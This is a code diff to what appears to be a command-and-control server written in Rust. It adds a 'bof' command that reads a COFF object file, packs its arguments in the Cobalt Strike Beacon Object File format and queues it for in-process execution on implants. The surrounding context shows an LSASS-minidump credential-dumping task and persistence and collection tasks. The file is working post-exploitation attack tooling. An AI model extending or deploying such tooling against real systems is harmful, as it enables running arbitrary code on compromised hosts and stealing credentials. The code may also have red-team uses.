@@ -1160,6 +1160,62 @@ async fn handle_mgmt(request: Value, state: &Arc<AppState>) -> Value {
             )
             .await
         }
+        "bof" => {
+            // ABR-T034: run an operator-side COFF object in-process.
+            // Args pack server-side, CS convention:
+            // [u32 total][i32 type][payload]*, type 0=int, 1=short, 2=str.
+            let source = request
+                .get("source")
+                .and_then(|v| v.as_str())
+                .unwrap_or("")
+                .to_string();
+            if source.is_empty() {
+                return json!({ "error": "bof requires source (local .obj file)" });
+            }
+            let data = match tokio::fs::read(&source).await {
+                Err(e) => return json!({ "error": format!("cannot read {source}: {e}") }),
+                Ok(data) => data,
+            };
+            if data.len() > 48_000 {
+                return json!({ "error": "bof object exceeds 48000 byte frame cap" });
+            }
+            let mut args = Vec::new();
+            if let Some(list) = request.get("args").and_then(|v| v.as_array()) {
+                let mut body = Vec::new();
+                for entry in list {
+                    let kind = entry.get("type").and_then(|v| v.as_str()).unwrap_or("str");
+                    body.extend_from_slice(&match kind {
+                        "int" => 0i32.to_le_bytes().to_vec(),
+                        "short" => 1i32.to_le_bytes().to_vec(),
+                        _ => 2i32.to_le_bytes().to_vec(),
+                    });
+                    match kind {
+                        "int" => body.extend_from_slice(
+                            &(entry.get("value").and_then(|v| v.as_i64()).unwrap_or(0) as i32)
+                                .to_le_bytes(),
+                        ),
+                        "short" => body.extend_from_slice(
+                            &(entry.get("value").and_then(|v| v.as_i64()).unwrap_or(0) as i16)
+                                .to_le_bytes(),
+                        ),
+                        _ => {
+                            body.extend_from_slice(
+                                entry
+                                    .get("value")
+                                    .and_then(|v| v.as_str())
+                                    .unwrap_or("")
+                                    .as_bytes(),
+                            );
+                            body.push(0);
+                        }
+                    }
+                }
+                let total = (body.len() + 4) as u32;
+                args.extend_from_slice(&total.to_le_bytes());
+                args.extend_from_slice(&body);
+            }
+            queue_task(state, &request, TaskBody::ExecBof { data, args }).await
+        }
         "cred" => {
             // ABR-T032/T033: LSASS minidump (user-mode / kernel-attach).
             let action = match request.get("action").and_then(|v| v.as_str()) {
@@ -1496,6 +1552,7 @@ fn task_kind_name(body: &TaskBody) -> &'static str {
         TaskBody::Persist { .. } => "persist",
         TaskBody::Collect { .. } => "collect",
         TaskBody::Cred { .. } => "cred",
+        TaskBody::ExecBof { .. } => "bof",
         TaskBody::Exit => "exit",
     }
 }
